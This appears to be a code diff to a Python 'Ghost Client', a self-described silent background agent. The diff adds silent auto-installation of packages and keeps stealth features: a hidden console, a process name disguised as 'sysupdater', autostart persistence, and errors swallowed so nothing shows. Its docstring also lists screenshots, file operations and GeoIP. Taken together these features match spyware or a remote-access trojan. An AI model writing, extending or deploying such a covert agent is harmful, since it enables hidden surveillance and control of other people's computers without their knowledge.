@@ -3,27 +3,95 @@
 
 """
 SDF Ghost Client - Complete Silent Background Agent
-- No console output at all (runs like ghost)
-- Auto-starts with system
-- Shows as 'sysupdater' in task manager
-- All features including GeoIP
-- No command line arguments needed
+Auto-installs all required libraries before use
+No console output, runs as 'sysupdater'
+All features including GeoIP, screenshots, file operations
 """
 
 import os
 import sys
+import subprocess
+import importlib
+import pkg_resources
+from pathlib import Path
+
+# ==============================================================================
+# AUTO-INSTALL DEPENDENCIES - COMPLETELY SILENT
+# ==============================================================================
+
+REQUIRED_PACKAGES = [
+    'psutil',
+    'cryptography',
+    'Pillow',
+    'requests'
+]
+
+# Optional packages (try to install but don't fail if not available)
+OPTIONAL_PACKAGES = [
+    'pyscreenshot',
+    'pypiwin32; sys_platform == "win32"'
+]
+
+def silent_install(package):
+    """Install package silently - no output"""
+    try:
+        subprocess.run(
+            [sys.executable, '-m', 'pip', 'install', '--quiet', package],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            check=False
+        )
+        return True
+    except:
+        return False
+
+def ensure_packages():
+    """Check and install required packages silently"""
+    installed = {pkg.key for pkg in pkg_resources.working_set}
+    
+    for package in REQUIRED_PACKAGES:
+        pkg_name = package.split(';')[0].strip()
+        pkg_key = pkg_name.lower().replace('-', '_')
+        
+        # Check if already installed
+        try:
+            pkg_resources.get_distribution(pkg_name)
+            continue
+        except pkg_resources.DistributionNotFound:
+            pass
+        
+        # Install silently
+        silent_install(package)
+    
+    # Try optional packages
+    for package in OPTIONAL_PACKAGES:
+        pkg_name = package.split(';')[0].strip()
+        try:
+            pkg_resources.get_distribution(pkg_name)
+        except:
+            silent_install(package)
+
+# Run dependency installation BEFORE anything else
+ensure_packages()
+
+# ==============================================================================
+# NOW IMPORT ALL DEPENDENCIES
+# ==============================================================================
+
 import json
 import base64
 import time
 import socket
-import subprocess
 import platform
 import tempfile
 import random
 import string
-from pathlib import Path
+import threading
+import hashlib
+import hmac
 from datetime import datetime
 from urllib import request, error
+from pathlib import Path
 
 # ==============================================================================
 # STEALTH CONFIGURATION - COMPLETELY SILENT
@@ -68,10 +136,9 @@ if HIDE_CONSOLE:
     os.environ['PYTHONUNBUFFERED'] = '1'
 
 # ==============================================================================
-# IMPORTS WITH SILENT FALLBACKS
+# SILENT IMPORTS WITH FALLBACKS
 # ==============================================================================
 
-# Try to import dependencies silently
 try:
     import psutil
     HAS_PSUTIL = True
@@ -115,13 +182,11 @@ class SingleInstance:
                         old_pid = int(f.read().strip())
                     # Check if process is still running
                     if platform.system() == 'Windows':
-                        # Windows: use tasklist
                         result = subprocess.run(['tasklist', '/FI', f'PID eq {old_pid}'], 
                                                capture_output=True, text=True)
                         if str(old_pid) in result.stdout:
                             return False
                     else:
-                        # Unix: send signal 0
                         try:
                             os.kill(old_pid, 0)
                             return False
@@ -760,6 +825,7 @@ X-GNOME-Autostart-enabled=true
 
 if __name__ == '__main__':
     try:
+        # Set process name to sysupdater
         try:
             if platform.system() != 'Windows':
                 import ctypes
@@ -767,6 +833,7 @@ if __name__ == '__main__':
         except:
             pass
         
+        # Setup auto-start (only once)
         try:
             flag_file = CACHE_DIR / '.installed'
             if not flag_file.exists():
@@ -776,8 +843,9 @@ if __name__ == '__main__':
         except:
             pass
         
+        # Start ghost client
         client = GhostClient()
         client.run()
         
     except:
-        pass  
+        pass  # Complete silence - never show any error
